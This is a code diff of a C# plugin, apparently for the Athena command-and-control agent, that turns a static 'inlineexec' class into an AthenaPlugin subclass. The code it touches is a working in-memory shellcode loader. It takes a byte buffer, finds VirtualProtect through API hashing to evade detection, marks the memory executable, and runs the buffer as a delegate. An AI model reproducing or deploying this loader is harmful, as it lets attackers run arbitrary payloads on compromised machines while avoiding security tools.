@@ -5,9 +5,9 @@ using System.Linq;
 using System.Net.NetworkInformation;
 using PluginBase;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class inlineexec
+    public class Plugin : AthenaPlugin
     {
         private delegate void BufferDelegate();
         private enum MemoryProtection : UInt32
@@ -27,8 +27,7 @@ namespace Plugin
         const long VirtPro = 65467780416196;
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             byte[] buffer;
             if (args.ContainsKey("buffer"))
@@ -46,9 +45,9 @@ namespace Plugin
                         IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro); //Get Pointer for VirtualProtect function
                         VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate)); //Create VirtualProtect Delegate
                         ptrVPD(pAddr, (UIntPtr)buffer.Length, 0x00000020, out lpfOldProtect); //Call Virtual Protect
-                        
+
                         BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate)); //Create delegate for our sc buffer
-                        
+
                         f(); //Execute buffer
                     }
                 }
